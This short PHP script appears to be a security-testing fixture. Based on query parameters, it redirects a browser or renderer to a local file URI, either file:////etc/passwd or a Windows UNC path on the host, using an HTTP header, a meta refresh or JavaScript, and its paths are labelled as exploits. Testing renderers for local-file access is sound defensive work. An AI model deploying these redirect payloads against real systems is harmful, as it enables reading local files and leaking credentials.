<?php
$redirectType = isset($_GET['redirectType']) ? $_GET['redirectType'] : '';
$os = isset($_GET['os']) ? $_GET['os'] : '';
if($redirectType === 'http') {
	if($os === 'windows') {
		header("Location: file://\\\\".$_SERVER['HTTP_HOST']."\\map\\exploit_redirect_local_file_iframe_windows");
	} else {
		header("Location: file:////etc/passwd");
	}
	exit();
} else if($redirectType === 'meta') {
	?>
<html>
<head>
<!-- IGNORE THIS CONTENTS -->
<meta http-equiv="refresh" content="0;url=<?php echo $os === 'windows' ? 'file://\\\\'.$_SERVER['HTTP_HOST'].'\\map\\exploit_redirect_meta_local_file_iframe_windows': 'file:////etc/passwd'?>" />
</head>
</html>
	<?php
} else if($redirectType === 'javascript') {
?>
<html>
<head>
<!-- IGNORE THIS CONTENTS -->
<script>location='<?php echo $os === 'windows' ? 'file://\\\\'.$_SERVER['HTTP_HOST'].'\\\\map\\\\exploit_redirect_meta_local_file_iframe_windows': 'file:////etc/passwd'?>';
</script>
</head>
</html>
<?php
}
?>